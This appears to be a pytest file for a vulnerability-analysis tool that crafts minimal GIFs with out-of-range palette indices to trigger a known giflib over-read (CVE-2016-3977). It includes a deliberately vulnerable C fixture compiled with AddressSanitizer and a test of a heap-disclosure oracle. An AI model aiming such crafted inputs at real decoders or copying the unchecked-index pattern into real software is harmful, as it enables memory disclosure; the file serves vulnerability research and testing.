"""Directed trigger for a palette/indexed-table over-read behind a container format
(analyze/poc/palette_overread.py).

A detector narrows to the palette-index sink (`Colors[GifRow[j]]` in gif2rgb, CVE-2016-3977 and
its re-files); this builds the smallest VALID GIF whose colour table is tiny and whose one decoded
pixel index is out of range, so the narrowed sink becomes a detonatable input -- no fuzzing. The
test validates the GIF without giflib (its own LZW decoder) and, when a C compiler is present,
reproduces the exact out-of-bounds read on a faithful fixture of the sink.
"""
from __future__ import annotations

import shutil
import subprocess

import pytest

from lykos.analyze.poc import palette_overread as po


def _lzw_decode_min8(data: bytes) -> list[int]:
    """Decode a GIF LZW sub-block stream with min code size 8 back to pixel indices -- enough to
    prove the stream this module emits is well-formed and carries the indices we asked for."""
    # unframe sub-blocks
    raw, i = bytearray(), 0
    while i < len(data):
        n = data[i]; i += 1
        if n == 0:
            break
        raw += data[i:i + n]; i += n
    clear, end = 256, 257
    code_size, next_code = 9, 258
    bits = nbits = 0
    pos = 0
    codes = []
    while pos < len(raw) or nbits >= code_size:
        while nbits < code_size and pos < len(raw):
            bits |= raw[pos] << nbits; nbits += 8; pos += 1
        if nbits < code_size:
            break
        code = bits & ((1 << code_size) - 1)
        bits >>= code_size; nbits -= code_size
        if code == end:
            break
        if code == clear:
            code_size, next_code = 9, 258
            continue
        codes.append(code)
        next_code += 1
        if next_code == (1 << code_size) and code_size < 12:
            code_size += 1
    return codes


def test_gif_is_structurally_valid_and_carries_the_out_of_range_index():
    g = po.gif_overindexed(colors=2, index=255, width=8, height=1)
    assert g[:6] == b"GIF89a" and g[-1:] == b"\x3b"
    # packed byte: GCT present, size exponent 0 -> 2 entries
    packed = g[10]
    assert packed & 0x80 and (2 << (packed & 0x07)) == 2
    # the colour table is 2*3 bytes, then the image separator
    assert g[13:13 + 6] and g[13 + 6:13 + 7] == b"\x2c"
    # locate the LZW stream: after image descriptor (10 bytes incl separator) + min-code-size byte
    img = g.index(b"\x2c", 13)
    lzw = g[img + 10 + 1:-1]            # sep+9 desc bytes, then min-code-size, image data .. trailer
    assert _lzw_decode_min8(lzw) == [255] * 8      # every pixel is index 255
    # the index (255) is far past the 2-entry table: the read is deep, not a 1-past slack byte
    assert 255 >= (2 << (packed & 0x07))


def test_index_rounds_table_size_up_to_a_power_of_two():
    g = po.gif_overindexed(colors=5, index=200, width=4, height=1)
    packed = g[10]
    assert (2 << (packed & 0x07)) == 8            # 5 -> next power of two, 8 entries
    img = g.index(b"\x2c", 13)
    assert _lzw_decode_min8(g[img + 11:-1]) == [200] * 4


# A faithful fixture of the sink: read a file of [count][pixels...], index a `count`-entry table.
_VULN = r"""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char **argv){
    FILE *f = fopen(argv[1], "rb");
    if (!f) return 2;
    unsigned char hdr; if (fread(&hdr,1,1,f)!=1) return 2;
    int count = hdr ? hdr : 1;
    unsigned char *table = malloc((size_t)count*3);   /* count colour entries */
    memset(table, 0x41, (size_t)count*3);
    unsigned char px; unsigned long sink = 0;
    while (fread(&px,1,1,f)==1){
        sink += table[(int)px*3];                     /* table[index] -- OOB when px>=count */
    }
    free(table);
    printf("%lu\n", sink);
    return 0;
}
"""


def test_disclosure_oracle_is_sound_and_forgery_proof():
    """confirm_disclosure must fire ONLY on a target that leaks offset-dependent heap, and must
    reject both a safe (clamping) target and an echo that cannot pass the negative control."""
    # model the heap the over-read reaches: a byte at colmap_base + idx*3 that is NOT a palette
    # entry and varies with idx (0xA0 ^ idx pattern).
    def heap(idx):
        return ((0xA0 ^ idx) & 0xFF, (idx * 3 + 5) & 0xFF, (idx * 7 + 9) & 0xFF)

    def _palette_entry_for(gif):
        # recover the in-bounds pixel index the constructor used and return its palette entry,
        # mirroring gif_overindexed's palette formula so the control matches.
        # (the test reads the index straight from the LZW the constructor emitted)
        img = gif.index(b"\x2c", 13)
        idx = _lzw_decode_min8(gif[img + 11:-1])[0]
        return idx

    def vulnerable(gif):
        idx = _palette_entry_for(gif)
        packed = gif[10]; tsz = 2 << (packed & 0x07)
        if idx < tsz:
            return ((idx * 17 + 1) & 0xFF, (idx * 29 + 7) & 0xFF, (idx * 43 + 13) & 0xFF)  # palette
        return heap(idx)                                   # out of range -> heap disclosed

    def safe(gif):                                          # clamps every index into the table
        packed = gif[10]; tsz = 2 << (packed & 0x07)
        idx = min(_palette_entry_for(gif), tsz - 1)
        return ((idx * 17 + 1) & 0xFF, (idx * 29 + 7) & 0xFF, (idx * 43 + 13) & 0xFF)

    def echo(_gif):                                         # returns a constant, unrelated to idx
        return (1, 2, 3)

    assert po.confirm_disclosure(vulnerable)["disclosed"] is True
    sv = po.confirm_disclosure(safe)
    assert sv["disclosed"] is False and sv["control_ok"] is True      # safe -> no false positive
    ev = po.confirm_disclosure(echo)
    assert ev["disclosed"] is False and ev["control_ok"] is False     # echo fails the control


@pytest.mark.skipif(not (shutil.which("gcc") or shutil.which("cc")), reason="no C compiler")
def test_the_constructed_index_reproduces_an_out_of_bounds_read(tmp_path):
    src = tmp_path / "v.c"; src.write_text(_VULN)
    exe = tmp_path / "v"
    if subprocess.run(["gcc", "-g", "-O0", "-fsanitize=address", "-o", str(exe), str(src)],
                      capture_output=True).returncode:
        pytest.skip("cannot build ASan fixture")
    # a 2-entry table, pixels all index 200: file is [2][200][200]...
    inp = tmp_path / "in.bin"
    inp.write_bytes(bytes([2]) + bytes([200] * 8))
    r = subprocess.run([str(exe), str(inp)], capture_output=True,
                       env={"ASAN_OPTIONS": "detect_leaks=0:abort_on_error=0"})
    assert b"heap-buffer-overflow" in r.stderr and b"READ of size" in r.stderr, \
        "the out-of-range index did not produce the expected OOB read"
